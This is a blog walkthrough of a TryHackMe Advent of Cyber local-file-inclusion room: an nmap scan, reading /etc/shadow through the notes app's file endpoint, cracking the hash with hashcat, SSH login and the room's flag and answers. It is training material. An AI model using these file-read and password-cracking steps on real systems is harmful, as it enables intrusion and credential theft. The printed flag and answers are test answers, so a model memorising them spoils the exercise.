---
title: "Advent of Cyber Day 15 LFI"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 15 LFI"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

Elf Charlie likes
to make notes and store them on his server. Are you able to take
advantage of this functionality and crack his password?

Read the supporting materials [here](https://blog.tryhackme.com/lfi/).

### Setup

```bash
kali@kali:~$ nmap -A -vv 10.10.45.154
```

```bash
22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 27:97:56:c6:7d:87:00:2d:a3:9c:90:60:9c:17:ae:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpcxSjvRT07NjHQOXap9xTO5mWnscMVSvlwVNNn3FT9phbKzzsD3ZXnIYcUHTIak8wKlGnSBmgjlVCgbzebvZDprNrjFDzQZZ+GX2ZJ+GtsPTZIbf3ynYVPfeLBdfuYYnkwf4U2o4em4CRSGzd+MUuLGNYMcKOC9h0g7kU4NybDVwgT6W9KDNeBqzd1oOnSj26hvYTO2N+6vIfwyIFrzASBp/1Sjy830vQdobpzL9r4Cb7sG8cBx1qw5iy6ImZXrRFt33+hNFCcMDr0XUMcw+6xvoEfWDAZoEqCRUaRKtDEcGnENW3NPG/YMhqXNoYq6qLzLIUnwzj3n2wEV/JCULj
|   256 3b:4c:29:10:da:0b:17:6c:ba:de:d0:66:66:20:c5:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGzgpJOUVURY/Wfz66y/OR17GgMyN05IcMVmVO2wE560O/KwqqX0qmlIZ60fjqpTd8dXXD2oYY4mUju4kh1hYTk=
|   256 15:70:d4:d5:aa:b6:4f:98:7f:2d:90:d8:b7:74:88:a6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5uDVGTfyLrVZrQzYS+YZJBtTBRFNLwueR4k+/DYdjp

80/tcp open http syn-ack Node.js (Express middleware)
|_http-favicon: Unknown favicon MD5: DBC69DB56435575CDC5CF45C96045958
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Public Notes
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### #1 What is Charlie going to book a holiday to?

<div className="Image__Medium">
  <img src="https://imgur.com/chYu9Xf.png" alt="blog_image" />
</div>

```bash
Hawaii
```

### #2 Read /etc/shadow and crack Charlies password.

If we check the source code of the webpage

```bash
<script>
  function getNote(note, id) {
     const url = '/get-file/' + note.replace(/\//g, '%2f')
      $.getJSON(url,  function(data) {
	 document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
      getNote('views/notes/note1.txt', '#note-1')
      getNote('views/notes/note2.txt', '#note-2')
      getNote('views/notes/note3.txt', '#note-3')
  </script>
```

Now let's fire up burp suite and make some LFI :D

<div className="Image__Medium">
  <img src="https://imgur.com/iv4ifNY.png" alt="blog_image" />
</div>

<div className="Image__Medium">
  <img src="https://imgur.com/Ah1MO52.png" alt="blog_image" />
</div>

Now that we have charlie's password hash let's crack it !

```bash
# Hash to decode
$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.
```

```bash
sudo hashcat -m 1800 -a 0 --force -o crack.txt hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
kali@kali:~$ sudo cat crack.txt
"password1"
```

### #3 What is flag1.txt?

Let's access the machine now with charlie's password

```bash
kali@kali:~$ ssh charlie@10.10.45.154

The authenticity of host 10.10.45.154 (10.10.45.154) cant be established.
ECDSA key fingerprint is SHA256:FTprTqjO/Yb1cVxlvn/P9VvlOeZMFbs4eQwOOTUqhg4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.45.154' (ECDSA) to the list of known hosts.

charlie@10.10.45.154 password: "password1"
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.

Last login: Fri Dec 13 21:44:29 2019 from 10.8.11.98

charlie@ip-10-10-45-154:~$
```

```bash
charlie@ip-10-10-45-154:~$ ls
flag1.txt
charlie@ip-10-10-45-154:~$ cat flag1.txt
'THM{4ea2adf842713ad3ce0c1f05ef12256d}'
```
